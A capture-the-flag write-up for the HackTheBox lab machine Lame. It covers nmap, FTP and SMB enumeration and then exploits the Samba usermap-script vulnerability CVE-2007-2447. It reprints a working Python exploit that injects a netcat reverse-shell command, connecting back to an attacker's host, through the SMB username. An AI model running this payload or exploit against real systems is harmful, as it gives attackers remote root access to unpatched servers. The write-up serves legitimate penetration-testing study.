# Lame - HackTheBox
Notes from Lame 10.10.10.3 HTB

## Enumeration
### Nmap
```sh
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h08m25s, deviation: 2h49m45s, median: 8m23s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-06-16T21:01:35-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

### FTP
```sh
>>> ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:onejump): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> exit
?Invalid command
ftp> quit
221 Goodbye.
```
FTP allows anonymous login but there is nothing in there.

### Smbmap
```sh
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
	Disk                                                    Permissions     Comment
	----                                                    -----------     -------
	print$                                                  NO ACCESS       Printer Drivers
	tmp                                                     READ, WRITE     oh noes!
	opt                                                     NO ACCESS
	IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))

```

#### Contents of tmp.
```sh
smb: \> ls
  .                                   D        0  Mon Jun 21 19:48:13 2021
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  .ICE-unix                          DH        0  Mon Jun 21 19:36:57 2021
  vmware-root                        DR        0  Mon Jun 21 19:37:27 2021
  .X11-unix                          DH        0  Mon Jun 21 19:37:23 2021
  .X0-lock                           HR       11  Mon Jun 21 19:37:23 2021
  5563.jsvc_up                        R        0  Mon Jun 21 19:38:00 2021
  vgauthsvclog.txt.0                  R     1600  Mon Jun 21 19:36:55 2021

                7282168 blocks of size 1024. 5386560 blocks available
smb: \>
```

We have access to the "tmp" share but there was nothing usefull in there either.

### Vulnerable samba version
![](images/Pasted%20image%2020210621194445.png)
This version os samba appears to be vulnerable to [CVE 2007-2447.](https://amriunix.com/post/cve-2007-2447-samba-usermap-script/)
## Exploit
Avoiding the metasploit module that exist for this vuln (OSCP prep and stuff), I found the following PoC in python. [exploit.py](https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py)

### Exploit code
```py
#!/usr/bin/python
# -*- coding: utf-8 -*-

# From : https://github.com/amriunix/cve-2007-2447
# case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    print("[*] CVE-2007-2447 - Samba usermap script")
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)
```

## Flags
The syntax to run the exploit is pretty straight forward, "python <file.py> <RHOST> <RPORT> <LHOST> <LPORT>", set up a nc listener and ready to go, root access.
	
![](images/Pasted%20image%2020210621200345.png)

Box rooted.
